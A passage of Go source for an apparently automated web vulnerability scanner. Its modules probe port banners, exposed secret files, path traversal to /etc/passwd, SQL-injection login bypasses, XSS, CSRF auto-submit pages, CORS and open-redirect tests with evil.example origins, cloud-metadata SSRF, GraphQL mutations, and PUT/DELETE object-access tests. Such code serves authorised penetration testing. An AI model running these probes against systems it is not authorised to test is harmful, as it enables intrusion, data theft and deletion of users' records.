		buf := make([]byte, 256)
		n, _ := conn.Read(buf)
		if n > 0 {
			banner = strings.TrimSpace(string(buf[:n]))
		}
		mu.Lock()
		openPorts = append(openPorts, openPort{tp.Port, tp.Name, banner})
		mu.Unlock()
	}

	workerPool(CommonTCPPorts, min(c.Args.Threads, 20), checkPort)

	if len(openPorts) > 0 {
		sort.Slice(openPorts, func(i, j int) bool { return openPorts[i].port < openPorts[j].port })
		var lines []string
		for _, op := range openPorts {
			if op.banner != "" {
				lines = append(lines, fmt.Sprintf("  - %d/tcp (%s): %s", op.port, op.name, trunc(op.banner, 60)))
			} else {
				lines = append(lines, fmt.Sprintf("  - %d/tcp (%s)", op.port, op.name))
			}
		}
		c.addF("portscan", fmt.Sprintf("Open TCP ports: %d discovered", len(openPorts)), "INFO",
			strings.Join(lines, "\n"), "")
	} else {
		c.addF("portscan", "No open ports in top list", "INFO", "", "")
	}
}

func runScan(c *Ctx) {
	c.phase("SCAN")
	br, _ := c.get("/.dragon_"+c.rand(10), nil)
	bs := 404
	if br != nil {
		bs = br.StatusCode
	}
	p := newProg(len(DirWL))
	sem := make(chan struct{}, c.Args.Threads)
	var wg sync.WaitGroup
	for _, path := range DirWL {
		wg.Add(1)
		go func(pa string) {
			defer wg.Done()
			defer p.inc()
			sem <- struct{}{}
			defer func() { <-sem }()
			up := "/" + strings.TrimLeft(pa, "/")
			r, _ := c.get(up, nil)
			if r == nil {
				return
			}
			st := r.StatusCode
			if st == bs {
				return
			}
			if st != 200 && st != 301 && st != 302 && st != 401 && st != 403 {
				return
			}
			sv := "INFO"
			ti := "Interesting: " + pa
			for _, m := range []string{".env", ".git", "backup", "config", "admin", "console", "upload"} {
				if strings.Contains(strings.ToLower(pa), m) {
					sv = "HIGH"
					ti = "Sensitive: " + pa
					break
				}
			}
			c.addF("scan", ti, sv,
				fmt.Sprintf("URL: %s%s\nStatus: %d", c.Base, up, st),
				fmt.Sprintf("curl -isk '%s%s'", c.Base, up))
		}(path)
	}
	wg.Wait()
}

func ensureCrawled(c *Ctx) {
	if len(c.Crawled) > 0 {
		return
	}
	c.phase("APP")
	vis := make(map[string]bool)
	q := []string{c.Target}
	for len(q) > 0 && len(c.Crawled) < c.Args.MaxPages {
		if c.cancelled() {
			break
		}
		u := q[0]
		q = q[1:]
		if vis[u] || !c.inScope(u) {
			continue
		}
		vis[u] = true
		r, b := c.get(u, nil)
		if r == nil {
			continue
		}
		pg := CrawlPage{u, r.StatusCode, b, r.Header}
		c.mu.Lock()
		c.Crawled = append(c.Crawled, pg)
		c.mu.Unlock()
		fmt.Printf("  \x1b[36m→\x1b[0m %s\n", u)

		ct := strings.ToLower(r.Header.Get("Content-Type"))
		if strings.Contains(ct, "json") {
			c.extractJSONRoutes(b, u)
		} else if strings.Contains(ct, "html") {
			// Extract links
			ms := reHref.FindAllStringSubmatch(b, -1)
			pu, _ := url.Parse(u)
			for _, m := range ms {
				a := resolveRef(pu, m[1])
				if a != "" && c.inScope(a) {
					q = append(q, a)
				}
			}
			// Extract forms
			c.parseForms(b, u)
			// Extract API routes from inline scripts
			c.extractJSRoutes(b, u)
		}
		time.Sleep(time.Duration(c.Delay * float64(time.Second)))
	}
	if len(c.Crawled) > 0 {
		pg := c.Crawled[0]
		for _, h := range []struct{ H, T, S string }{
			{"Strict-Transport-Security", "HSTS missing", "LOW"},
			{"X-Content-Type-Options", "XCTO missing", "INFO"},
			{"Content-Security-Policy", "CSP missing", "INFO"},
			{"X-Frame-Options", "XFO missing", "LOW"},
		} {
			if pg.Headers.Get(h.H) == "" {
				c.addF("app", h.T, h.S, "Missing: "+h.H, fmt.Sprintf("curl -isk '%s'", pg.URL))
			}
		}
		if s := pg.Headers.Get("Server"); s != "" {
			c.addF("app", "Server disclosure", "INFO", "Server: "+s, "")
		}
		for lbl, pat := range SensitivePat {
			ms := regexp.MustCompile(pat).FindAllString(pg.Text, -1)
			if len(ms) > 0 {
				c.addF("app", "Sensitive: "+lbl, "INFO", fmt.Sprintf("%v", ms[:min(5, len(ms))]), "")
			}
		}
	}
	if len(c.Forms) > 0 {
		c.addF("app", fmt.Sprintf("Forms discovered: %d", len(c.Forms)), "INFO",
			fmt.Sprintf("First: %s %s", c.Forms[0].Method, c.Forms[0].Action), "")
	}
	if len(c.APIEndpoints) > 0 {
		c.addF("app", fmt.Sprintf("API endpoints discovered: %d", len(c.APIEndpoints)), "INFO",
			fmt.Sprintf("Sample: %s", c.APIEndpoints[0].Path), "")
	}
}

// parseForms extracts HTML forms from page content.
func (c *Ctx) parseForms(html, pageURL string) {
	forms := reFormTag.FindAllString(html, -1)
	for _, formHTML := range forms {
		fd := FormData{Method: "GET", PageURL: pageURL}
		if m := reFormAttrs.FindStringSubmatch(formHTML); len(m) > 1 {
			attrs := reAttr.FindAllStringSubmatch(m[1], -1)
			for _, a := range attrs {
				switch strings.ToLower(a[1]) {
				case "action":
					fd.Action = a[2]
				case "method":
					fd.Method = strings.ToUpper(a[2])
				}
			}
		}
		if fd.Action == "" || fd.Action == "#" {
			fd.Action = pageURL
		} else {
			page, err := url.Parse(pageURL)
			if err != nil {
				continue
			}
			fd.Action = resolveRef(page, fd.Action)
		}
		if !c.inScope(fd.Action) {
			continue
		}
		inputs := reInputTag.FindAllStringSubmatch(formHTML, -1)
		for _, inp := range inputs {
			ff := FormField{}
			attrs := reAttr.FindAllStringSubmatch(inp[1], -1)
			for _, a := range attrs {
				switch strings.ToLower(a[1]) {
				case "name":
					ff.Name = a[2]
				case "type":
					ff.Type = a[2]
				case "value":
					ff.Value = a[2]
				}
			}
			if ff.Name != "" {
				fd.Fields = append(fd.Fields, ff)
			}
		}
		c.mu.Lock()
		c.Forms = append(c.Forms, fd)
		c.mu.Unlock()
	}
}

// extractJSRoutes finds API-like paths in JS/HTML content.
func (c *Ctx) extractJSRoutes(content, source string) {
	reRoute := regexp.MustCompile(`["'](/api/[a-zA-Z0-9_\-/.]+)["']`)
	ms := reRoute.FindAllStringSubmatch(content, -1)
	seen := make(map[string]bool)
	c.mu.Lock()
	defer c.mu.Unlock()
	for _, m := range ms {
		p := m[1]
		if !seen[p] {
			seen[p] = true
			c.APIEndpoints = append(c.APIEndpoints, APIEndpoint{Path: p, Method: "GET", Source: source})
		}
	}
}

// extractJSONRoutes tries to find URL-like paths in JSON response bodies.
func (c *Ctx) extractJSONRoutes(body, source string) {
	reURL := regexp.MustCompile(`"((?:/[a-zA-Z0-9_\-/.]+){2,})"`)
	ms := reURL.FindAllStringSubmatch(body, -1)
	c.mu.Lock()
	defer c.mu.Unlock()
	for _, m := range ms {
		c.APIEndpoints = append(c.APIEndpoints, APIEndpoint{Path: m[1], Method: "GET", Source: "json:" + source})
	}
}

func runApp(c *Ctx) { ensureCrawled(c) }

func runJS(c *Ctx) {
	c.phase("JS")
	ensureCrawled(c)
	for _, pg := range c.Crawled {
		for lbl, pat := range JSKeys {
			ms := regexp.MustCompile(pat).FindAllString(pg.Text, -1)
			if len(ms) > 0 {
				c.addF("js", "Secret: "+lbl, "HIGH", fmt.Sprintf("Source: %s\nMatches: %v", pg.URL, ms[:min(5, len(ms))]), "")
			}
		}
		sms := reSrc.FindAllStringSubmatch(pg.Text, -1)
		pu, _ := url.Parse(pg.URL)
		for _, m := range sms {
			su := resolveRef(pu, m[1])
			if su != "" && c.inScope(su) {
				r, b := c.get(su, nil)
				if r != nil && r.StatusCode == 200 {
					c.mu.Lock()
					c.JSBlobs[su] = b
					c.mu.Unlock()
					for lbl, pat := range JSKeys {
						ms := regexp.MustCompile(pat).FindAllString(b, -1)
						if len(ms) > 0 {
							c.addF("js", "JS Secret: "+lbl, "HIGH", fmt.Sprintf("Source: %s", su), "")
						}
					}
				}
			}
		}
	}
}

func runDOM(c *Ctx) {
	c.phase("DOM")
	ensureCrawled(c)
	for _, pg := range c.Crawled {
		for _, s := range DomSinks {
			if strings.Contains(pg.Text, s) {
				c.addF("dom", "DOM sink: "+s, "INFO", fmt.Sprintf("Source: %s", pg.URL), "")
			}
		}
	}
}

func runParam(c *Ctx) {
	c.phase("PARAM")
	ensureCrawled(c)
	cu := []string{c.Target, c.Base + "/news", c.Base + "/api"}
	p := newProg(len(cu) * len(ParamWL))
	sem := make(chan struct{}, c.Args.Threads)
	var wg sync.WaitGroup
	for _, u := range cu {
		pu, _ := url.Parse(u)
		br, bb := c.get(u, nil)
		if br == nil {
			continue
		}
		bSt, bLen := br.StatusCode, len(bb)
		for _, param := range ParamWL {
			wg.Add(1)
			go func(u, pm string, bp *url.URL, bs, bl int) {
				defer wg.Done()
				defer p.inc()
				sem <- struct{}{}
				defer func() { <-sem }()
				qs := bp.Query()
				qs.Set(pm, "1")
				fu := bp.Scheme + "://" + bp.Host + bp.Path + "?" + qs.Encode()
				r, b := c.get(fu, nil)
				if r == nil {
					return
				}
				if r.StatusCode != bs || abs(len(b)-bl) > 300 {
					c.addF("param", "Param changes: "+pm, "INFO",
						fmt.Sprintf("URL: %s\nStatus: %d\nBaseline: %d/%d", fu, r.StatusCode, bs, bl),
						fmt.Sprintf("curl -isk '%s'", fu))
				}
			}(u, param, pu, bSt, bLen)
		}
	}
	wg.Wait()
	for _, u := range cu[:min(3, len(cu))] {
		pu, _ := url.Parse(u)
		for _, pm := range RedirectWL {
			qs := pu.Query()
			qs.Set(pm, "https://evil.example")
			fu := pu.Scheme + "://" + pu.Host + pu.Path + "?" + qs.Encode()
			r, _ := c.get(fu, nil)
			if r != nil {
				if l := r.Header.Get("Location"); strings.Contains(l, "evil.example") {
					c.addF("param", "Open redirect: "+pm, "HIGH",
						fmt.Sprintf("URL: %s\nRedirect: %s", fu, l),
						fmt.Sprintf("curl -isk '%s'", fu))
				}
			}
			time.Sleep(time.Duration(c.Delay * float64(time.Second)))
		}
	}
}

func runSecret(c *Ctx) {
	c.phase("SECRET")
	br, _ := c.get("/.dragon_"+c.rand(10), nil)
	bs := 404
	if br != nil {
		bs = br.StatusCode
	}
	p := newProg(len(SecretWL))
	sem := make(chan struct{}, c.Args.Threads)
	var wg sync.WaitGroup
	for _, path := range SecretWL {
		wg.Add(1)
		go func(pa string) {
			defer wg.Done()
			defer p.inc()
			sem <- struct{}{}
			defer func() { <-sem }()
			r, b := c.get("/"+pa, nil)
			if r == nil {
				return
			}
			st := r.StatusCode
			if st == bs {
				return
			}
			if st == 200 || st == 301 || st == 302 {
				sv := "HIGH"
				if st != 200 {
					sv = "MEDIUM"
				}
				for _, m := range []string{".env", "private.key", "id_rsa", "credentials"} {
					if strings.Contains(strings.ToLower(pa), m) && st == 200 {
						sv = "CRITICAL"
						break
					}
				}
				c.addF("secret", "Secret: "+pa, sv,
					fmt.Sprintf("URL: %s/%s\nStatus: %d\nLen: %d", c.Base, pa, st, len(b)),
					fmt.Sprintf("curl -isk '%s/%s'", c.Base, pa))
			}
		}(path)
	}
	wg.Wait()
}

func runFile(c *Ctx) {
	c.phase("FILE")
	paths := []string{
		"/view?file=../app.py", "/view?file=../../etc/passwd",
		"/api/stream/..%2f.env", "/static/../../../etc/passwd",
		"/videos/../.env", "/videos/../package.json",
		"/api/stream/..%2f..%2f..%2fetc%2fpasswd",
	}
	fileMarkers := []string{"root:", "daemon:", "<?php", "import ", "def ", "[boot loader]", "DB_", "APP_KEY", "dependencies", "devDependencies", "SECRET_KEY"}
	for _, p := range paths {
		r, b := c.get(p, nil)
		if r == nil {
			continue
		}
		if r.StatusCode == 200 {
			ct := strings.ToLower(r.Header.Get("Content-Type"))
			if strings.Contains(b, "root:") || strings.Contains(b, "daemon:") {
				c.addF("file", "Traversal confirmed (/etc/passwd): "+p, "CRITICAL", trunc(b, 500),
					fmt.Sprintf("curl -isk '%s%s'", c.Base, p))
			} else if containsAny(b, fileMarkers) || (!strings.Contains(ct, "html") && len(b) > 0) {
				c.addF("file", "File disclosure: "+p, "HIGH", trunc(b, 300),
					fmt.Sprintf("curl -isk '%s%s'", c.Base, p))
			}
		}
		time.Sleep(time.Duration(c.Delay * float64(time.Second)))
	}
}

func runCORS(c *Ctx) {
	c.phase("CORS")
	ps := []string{"/", "/api", "/api/me"}
	// Build dynamic bypass origins based on the target domain.
	bd := c.baseDomain(c.Host)
	dynamicOrigins := []string{
		"https://evil.example",
		"null",
		"http://localhost:3000",
		"file://",
		"https://evil." + bd,            // subdomain prefix
		"https://" + bd + ".evil.com",   // suffix attack
		"https://evil" + bd,             // prefix attack (no dot)
		"http://" + c.Host,              // scheme downgrade
		"https://" + bd + "`evil.com",   // backtick bypass
		"https://" + bd + "%60evil.com", // encoded backtick
		"https://not" + bd,              // prefix
	}
	type corsTask struct{ path, origin string }
	var tasks []corsTask
	for _, p := range ps {
		for _, o := range dynamicOrigins {
			tasks = append(tasks, corsTask{p, o})
		}
	}
	checkCORS := func(t corsTask) {
		r, _ := c.get(t.path, map[string]string{"Origin": t.origin})
		if r == nil {
			return
		}
		a := r.Header.Get("Access-Control-Allow-Origin")
		ac := r.Header.Get("Access-Control-Allow-Credentials")
		if a == "" {
			return
		}
		creds := strings.ToLower(ac) == "true"
		if a == t.origin && creds {
			c.addF("cors", "CORS reflects+creds: "+t.path, "HIGH",
				fmt.Sprintf("Origin: %s\nACAO: %s\nCredentials: true", t.origin, a), "")
		} else if a == t.origin {
			c.addF("cors", "CORS reflects: "+t.path, "MEDIUM",
				fmt.Sprintf("Origin: %s\nACAO: %s", t.origin, a), "")
		} else if a == "*" {
			if creds {
				c.addF("cors", "CORS wildcard+creds: "+t.path, "HIGH", "ACAO: * with credentials", "")
			} else {
				c.addF("cors", "CORS wildcard: "+t.path, "INFO", "ACAO: *", "")
			}
		}
	}
	workerPool(tasks, c.Args.Threads, checkCORS)
}

func runHeader(c *Ctx) {
	c.phase("HEADER")
	aps := []string{"/admin", "/console", "/dashboard"}
	for _, ap := range aps {
		br, _ := c.get(ap, nil)
		if br == nil {
			continue
		}
		bs := br.StatusCode
		for _, hs := range BypassHeaders {
			r, _ := c.get(ap, hs)
			if r == nil {
				continue
			}
			if r.StatusCode != bs {
				sv := "HIGH"
				if r.StatusCode == 200 && bs == 403 {
					sv = "CRITICAL"
				}
				c.addF("header", "Bypass: "+ap+" | "+fmt.Sprintf("%v", hs), sv,
					fmt.Sprintf("Headers: %v\nBaseline: %d → New: %d", hs, bs, r.StatusCode), "")
			}
		}
	}
}

func runRate(c *Ctx) {
	c.phase("RATE")
	if !requireActive(c, "rate", "Rate-limit probe") {
		return
	}
	for _, p := range []string{"/api/me", "/login"} {
		for i := 0; i < 5; i++ {
			c.get(p, nil)
			time.Sleep(100 * time.Millisecond)
		}
	}
	c.addF("rate", "Rate limit module done", "INFO", "", "")
}

func runSQLI(c *Ctx) {
	c.phase("SQLI")
	if !requireActive(c, "sqli", "SQL injection probe") {
		return
	}
	ensureCrawled(c)
	pls := []string{
		`{"username":"admin' OR '1'='1","password":"x"}`,
		`{"username":"admin' --","password":"x"}`,
		`{"username":"' OR 1=1 --","password":"x"}`,
	}
	formSQLPayloads := []string{
		"' OR '1'='1",
		"' OR 1=1 --",
		"admin' --",
		"1' UNION SELECT NULL--",
	}
	for _, p := range []string{"/api/login", "/login"} {
		for _, pl := range pls {
			r, b := c.post(p, nil, pl, "application/json")
			if r == nil {
				continue
			}
			if containsAny(b, SQLMarkers) || r.StatusCode == 500 {
				c.addF("sqli", "SQL error in response", "HIGH",
					fmt.Sprintf("Payload: %s\nBody: %s", pl, trunc(b, 300)), "")
			}
			time.Sleep(time.Duration(c.Delay * float64(time.Second)))
		}
	}
	// Test discovered forms for SQL injection
	for _, form := range c.Forms {
		if len(form.Fields) == 0 {
			continue
		}
		for _, sqlPl := range formSQLPayloads[:2] {
			vals := url.Values{}
			for _, fld := range form.Fields {
				vals.Set(fld.Name, sqlPl)
			}
			var r *http.Response
			var b string
			if form.Method == "POST" {
				r, b = c.post(form.Action, nil, vals.Encode(), "application/x-www-form-urlencoded")
			} else {
				targetURL := form.Action
				if strings.Contains(targetURL, "?") {
					targetURL += "&" + vals.Encode()
				} else {
					targetURL += "?" + vals.Encode()
				}
				r, b = c.get(targetURL, nil)
			}
			if r != nil && (containsAny(b, SQLMarkers) || r.StatusCode == 500) {
				c.addF("sqli", "SQL error in form: "+form.Action, "HIGH",
					fmt.Sprintf("Form: %s %s\nPayload: %s\nBody: %s", form.Method, form.Action, sqlPl, trunc(b, 300)),
					fmt.Sprintf("curl -isk -X %s '%s'", form.Method, form.Action))
				break
			}
		}
	}
}

func runIDOR(c *Ctx) {
	c.phase("IDOR")
	for uid := 1; uid <= 10; uid++ {
		r, b := c.get(fmt.Sprintf("/api/users/%d", uid), nil)
		if r != nil && r.StatusCode == 200 && !isBotChallengeOrBlock(b, r.StatusCode, r.Header) {
			ct := strings.ToLower(r.Header.Get("Content-Type"))
			if (strings.Contains(ct, "json") || strings.Contains(b, "username")) && !strings.Contains(b, "<script") {
				c.addF("idor", fmt.Sprintf("User enum: /api/users/%d", uid), "MEDIUM",
					trunc(b, 200), fmt.Sprintf("curl -isk '%s/api/users/%d'", c.Base, uid))
			}
		}
		time.Sleep(time.Duration(c.Delay * float64(time.Second)))
	}
}

func runXSS(c *Ctx) {
	c.phase("XSS")
	if !requireActive(c, "xss", "XSS probe") {
		return
	}
	ensureCrawled(c)
	mk := "drxss" + c.rand(6)
	// 1. Test URL parameters in crawled pages
	for _, pg := range c.Crawled {
		pu, _ := url.Parse(pg.URL)
		qs := pu.Query()
		if len(qs) == 0 {
			continue
		}
		for pm := range qs {
			fq := url.Values{}
			// Preserve all original params so the page renders correctly.
			for k, vs := range qs {
				for _, v := range vs {
					fq.Add(k, v)
				}
			}
			fq.Set(pm, "\">"+mk)
			fu := pu.Scheme + "://" + pu.Host + pu.Path + "?" + fq.Encode()
			r, b := c.get(fu, nil)
			if r != nil && strings.Contains(b, mk) {
				c.addF("xss", "Reflected XSS", "HIGH",
					fmt.Sprintf("URL: %s", fu), fmt.Sprintf("curl -isk '%s'", fu))
			}
		}
	}
	// 2. Test discovered HTML forms
	for _, form := range c.Forms {
		if len(form.Fields) == 0 {
			continue
		}
		for _, targetField := range form.Fields {
			if targetField.Type == "hidden" || targetField.Type == "submit" {
				continue
			}
			vals := url.Values{}
			for _, fld := range form.Fields {
				if fld.Name == targetField.Name {
					vals.Set(fld.Name, "\">"+mk)
				} else {
					vals.Set(fld.Name, "test")
				}
			}
			var r *http.Response
			var b string
			if form.Method == "POST" {
				r, b = c.post(form.Action, nil, vals.Encode(), "application/x-www-form-urlencoded")
			} else {
				targetURL := form.Action
				if strings.Contains(targetURL, "?") {
					targetURL += "&" + vals.Encode()
				} else {
					targetURL += "?" + vals.Encode()
				}
				r, b = c.get(targetURL, nil)
			}
			if r != nil && strings.Contains(b, mk) {
				c.addF("xss", "Form Reflected XSS: "+form.Action+" ("+targetField.Name+")", "HIGH",
					fmt.Sprintf("Form: %s %s\nField: %s", form.Method, form.Action, targetField.Name),
					fmt.Sprintf("curl -isk -X %s '%s'", form.Method, form.Action))
			}
		}
	}
}

func runCSRF(c *Ctx) {
	c.phase("CSRF")
	ensureCrawled(c)
	// 1. Generate generic PoC
	h := fmt.Sprintf("<html><body><h1>CSRF PoC</h1><form method=POST action='%s/api/news'><input name=title value=CSRF><input type=submit></form><script>document.forms[0].submit()</script></body></html>", c.Base)
	p := filepath.Join(c.PocDir, "csrf_poc.html")
	c.saveTxt(p, h)
	c.addF("csrf", "CSRF PoC generated", "INFO", "File: "+p, "open "+p)

	// 2. Analyze discovered forms for missing CSRF tokens
	for i, form := range c.Forms {
		if form.Method != "POST" {
			continue
		}
		hasCSRFToken := false
		for _, fld := range form.Fields {
			nameLower := strings.ToLower(fld.Name)
			if strings.Contains(nameLower, "csrf") || strings.Contains(nameLower, "token") || strings.Contains(nameLower, "xsrf") {
				hasCSRFToken = true
				break
			}
		}
		if !hasCSRFToken {
			pocPath := filepath.Join(c.PocDir, fmt.Sprintf("csrf_form_%d.html", i+1))
			var inputsHTML []string
			for _, fld := range form.Fields {
				inputsHTML = append(inputsHTML, fmt.Sprintf("<input type='hidden' name='%s' value='%s'>", escHTML(fld.Name), escHTML(fld.Value)))
			}
			pocContent := fmt.Sprintf("<html><body><h1>CSRF PoC - %s</h1><form method='POST' action='%s'>%s<input type='submit' value='Submit'></form><script>document.forms[0].submit()</script></body></html>",
				escHTML(form.Action), escHTML(form.Action), strings.Join(inputsHTML, "\n"))
			c.saveTxt(pocPath, pocContent)
			c.addF("csrf", "Form without anti-CSRF token: "+form.Action, "MEDIUM",
				fmt.Sprintf("Action: %s\nPoC: %s", form.Action, pocPath), "open "+pocPath)
		}
	}
}

func runCache(c *Ctx) {
	c.phase("CACHE")
	if !requireActive(c, "cache", "Cache-poisoning probe") {
		return
	}
	eh := "evil.example"
	r, b := c.get("/", map[string]string{"X-Forwarded-Host": eh})
	if r != nil && strings.Contains(b, eh) {
		c.addF("cache", "Cache poisoning", "HIGH", "Host: "+eh, "")
	}
}

func runSSRF(c *Ctx) {
	c.phase("SSRF")
	if !requireActive(c, "ssrf", "SSRF probe") {
		return
	}
	vs := []string{
		c.Base + "/proxy?url=http://169.254.169.254/",
		c.Base + "/api/webhook?callback=http://169.254.169.254/",
	}
	for _, v := range vs {
		r, b := c.get(v, nil)
		if r != nil && containsAny(b, []string{"ami-id", "instance-id", "meta-data"}) {
			c.addF("ssrf", "SSRF confirmed", "CRITICAL",
				fmt.Sprintf("URL: %s\nBody: %s", v, trunc(b, 300)),
				fmt.Sprintf("curl -isk '%s'", v))
		}
		time.Sleep(time.Duration(c.Delay * float64(time.Second)))
	}
}

// ============================================================================
// PRO MODULES — Part 2
// ============================================================================

func runGraphQL(c *Ctx) {
	c.phase("GRAPHQL")
	var gURL string
	for _, p := range []string{"/graphql", "/graphiql", "/api/graphql", "/query"} {
		r, _ := c.post(p, nil, `{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}`, "application/json")
		if r != nil && r.StatusCode == 200 {
			gURL = c.Base + p
			break
		}
	}
	if gURL == "" {
		c.addF("graphql", "No GraphQL endpoint", "INFO", "", "")
		return
	}
	r, b := c.post(gURL, nil, `{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}`, "application/json")
	if r == nil {
		return
	}
	if strings.Contains(b, "__schema") {
		c.addF("graphql", "Introspection exposed — full schema", "HIGH", trunc(b, 500),
			fmt.Sprintf("curl -sk -X POST '%s' -d '{\"query\":\"{__schema{types{name}}}\"}'", gURL))
		ms := regexp.MustCompile("\"name\":\"([a-zA-Z]+)\"").FindAllStringSubmatch(b, -1)
		var muts []string
		for _, m := range ms {
			n := m[1]
			if strings.Contains(n, "create") || strings.Contains(n, "delete") || strings.Contains(n, "update") || strings.Contains(n, "login") || strings.Contains(n, "register") {
				muts = append(muts, n)
			}
		}
		if len(muts) > 0 {
			c.addF("graphql", fmt.Sprintf("Mutations found: %d", len(muts)), "HIGH", strings.Join(muts, ", "), "")
		}
		if c.Args.Active {
			for _, mut := range muts {
				pl := fmt.Sprintf(`{"query":"mutation { %s(id:1) { id } }"}`, mut)
				r2, b2 := c.post(gURL, nil, pl, "application/json")
				if r2 != nil && r2.StatusCode == 200 && !strings.Contains(b2, "error") {
					c.addF("graphql", "Potential unauthorized mutation: "+mut, "HIGH", trunc(b2, 300),
						fmt.Sprintf("curl -sk -X POST '%s' -d '%s'", gURL, pl))
				}
			}
		} else if len(muts) > 0 {
			c.addF("graphql", "Mutations present — skipped exec (use --active)", "INFO",
				strings.Join(muts, ", "), "")
		}
	} else if strings.Contains(b, "errors") {
		c.addF("graphql", "Introspection blocked", "MEDIUM", trunc(b, 300), "")
		suggest := `{"query":"{ __type(name: \"Query\") { fields { name } } }"}`
		r2, b2 := c.post(gURL, nil, suggest, "application/json")
		if r2 != nil && strings.Contains(b2, "Did you mean") {
			c.addF("graphql", "Clairvoyance: field suggestions leaked", "HIGH", trunc(b2, 300), "")
		}
	}
}

func runBOLA(c *Ctx) {
	c.phase("BOLA")
	eps := []string{"/api/users/", "/api/user/", "/api/profile/", "/api/accounts/", "/api/orders/", "/api/posts/", "/api/items/", "/api/documents/", "/api/collections/"}
	for _, ep := range eps {
		for uid := 1; uid <= 5; uid++ {
			u := c.Base + ep + strconv.Itoa(uid)
			r1, b1 := c.get(u, nil)
			if r1 == nil {
				continue
			}
			if r1.StatusCode == 200 && len(b1) > 10 && !isBotChallengeOrBlock(b1, r1.StatusCode, r1.Header) {
				ct := strings.ToLower(r1.Header.Get("Content-Type"))
				if strings.Contains(ct, "json") || ((strings.Contains(b1, "username") || strings.Contains(b1, "email") || strings.Contains(b1, "\"id\":")) && !strings.Contains(b1, "<html")) {
					c.addF("bola", fmt.Sprintf("Accessible resource — verify BOLA: %s%d", ep, uid), "INFO",
						fmt.Sprintf("URL: %s\nStatus: 200\nBody: %s", u, trunc(b1, 200)),
						fmt.Sprintf("curl -isk '%s'", u))
				}
			}
			if c.Args.Active {
				for _, m := range []string{"PUT", "PATCH", "DELETE"} {
					resp, bodyStr := c.req(m, u, nil, "", "", false)
					if resp != nil {
						if (resp.StatusCode == 200 || resp.StatusCode == 204) && !isBotChallengeOrBlock(bodyStr, resp.StatusCode, resp.Header) {
							ct := strings.ToLower(resp.Header.Get("Content-Type"))
							if resp.StatusCode == 204 || strings.Contains(ct, "json") || strings.Contains(bodyStr, "success") || strings.Contains(bodyStr, "deleted") || strings.Contains(bodyStr, "updated") {
								c.addF("bola", fmt.Sprintf("Write IDOR: %s %s%d", m, ep, uid), "CRITICAL",
									fmt.Sprintf("Method: %s\nURL: %s\nStatus: %d\nBody: %s", m, u, resp.StatusCode, trunc(bodyStr, 150)),
									fmt.Sprintf("curl -sk -X %s '%s'", m, u))
							}
						}
					}
				}
			}
			time.Sleep(time.Duration(c.Delay * float64(time.Second)))
		}
	}
}

func runWordlist(c *Ctx) {
	c.phase("WORDLIST")
	r, b := c.get("/", nil)
	if r == nil {
		return
	}
	html := b
	var ext []string
	for _, m := range reID.FindAllStringSubmatch(html, -1) {
		if len(m[1]) > 2 {
			ext = append(ext, m[1])
		}
	}
	for _, m := range reClass.FindAllStringSubmatch(html, -1) {
		for _, cl := range strings.Fields(m[1]) {
			if len(cl) > 2 {
				ext = append(ext, cl)
			}
		}
	}
	for _, m := range reName.FindAllStringSubmatch(html, -1) {
		if len(m[1]) > 2 {
			ext = append(ext, m[1])
		}
	}
	for _, m := range reSrc.FindAllStringSubmatch(html, -1) {
		jsU := urljoin(c.Base, m[1])
		if c.inScope(jsU) {
			jr, jb := c.get(jsU, nil)
			if jr != nil && jr.StatusCode == 200 {
				for _, m2 := range reJSVar.FindAllStringSubmatch(jb, -1) {
					ext = append(ext, m2[1])
				}
				for _, m2 := range reAPIPath.FindAllStringSubmatch(jb, -1) {
					ext = append(ext, m2[1])
				}
			}
		}
	}
	seen := make(map[string]bool)
	var filtered []string
	for _, w := range ext {
		w = strings.ToLower(w)
		if len(w) > 2 && !seen[w] && !strings.HasPrefix(w, "http") {
			seen[w] = true
			filtered = append(filtered, w)
		}
	}
	if len(filtered) > 0 {
		c.saveTxt(filepath.Join(c.LogDir, "intelligent_wordlist.txt"), strings.Join(filtered, "\n"))
		c.addF("wordlist", fmt.Sprintf("Generated %d words", len(filtered)), "INFO",
			fmt.Sprintf("Sample: %s", strings.Join(filtered[:min(20, len(filtered))], ", ")), "")
		p := newProg(min(50, len(filtered)))
		sem := make(chan struct{}, c.Args.Threads)
		var wg sync.WaitGroup
		for i, w := range filtered {
			if i >= 50 {
				break
			}
			wg.Add(1)
			go func(w string) {
				defer wg.Done()
				defer p.inc()
				sem <- struct{}{}
				defer func() { <-sem }()
				r, _ := c.get("/"+w, nil)
				if r != nil && (r.StatusCode == 200 || r.StatusCode == 301 || r.StatusCode == 401 || r.StatusCode == 403) {
					c.addF("wordlist", "Path hit: "+w, "INFO",
						fmt.Sprintf("Status: %d", r.StatusCode),
						fmt.Sprintf("curl -isk '%s/%s'", c.Base, w))
				}
			}(w)
		}
		wg.Wait()
	}
}

func runCloud(c *Ctx) {
	c.phase("CLOUD SSRF")
	if !requireActive(c, "cloud", "Cloud metadata SSRF probe") {
		return
	}
	// Only test via target proxy endpoints — direct metadata requests would
	// probe the scanner's own host, producing false positives.
	sps := []string{"/proxy", "/api/proxy", "/fetch", "/api/fetch", "/webhook", "/api/webhook"}
	total := len(sps) * len(CloudEPs)
	p := newProg(total)
	for _, sp := range sps {
		for _, ep := range CloudEPs {
			u := c.Base + sp + "?url=" + url.QueryEscape(ep.U)
			r, b := c.get(u, nil)
			if r != nil && r.StatusCode == 200 && containsAny(b, []string{"ami-id", "instance-id", "meta-data", "project-id"}) {
				c.addF("cloud", fmt.Sprintf("SSRF to %s via %s", ep.C, sp), "CRITICAL",
					fmt.Sprintf("URL: %s\nBody: %s", u, trunc(b, 300)),
					fmt.Sprintf("curl -isk '%s'", u))
			}
			p.inc()
			time.Sleep(time.Duration(c.Delay * float64(time.Second)))
		}
	}
}
func runMass(c *Ctx) {
	c.phase("MASS ASSIGN")
	if !c.Args.Active {
		c.addF("mass", "Mass assignment probe skipped (use --active)", "INFO", "", "")
		return
	}
	for _, ep := range []string{"/api/users", "/api/user", "/api/profile", "/api/me", "/api/register", "/api/signup", "/api/settings", "/api/account"} {
		r, _ := c.get(ep, nil)
		if r == nil {
			continue
		}
		if r.StatusCode != 200 && r.StatusCode != 401 && r.StatusCode != 403 {
			continue
		}
		for _, f := range PrivFields {
			for _, v := range []string{"true", "1", "admin"} {
				pl, _ := json.Marshal(map[string]interface{}{f: v})
				r2, b := c.post(ep, nil, string(pl), "application/json")
				if r2 != nil && (r2.StatusCode == 200 || r2.StatusCode == 201 || r2.StatusCode == 204) {
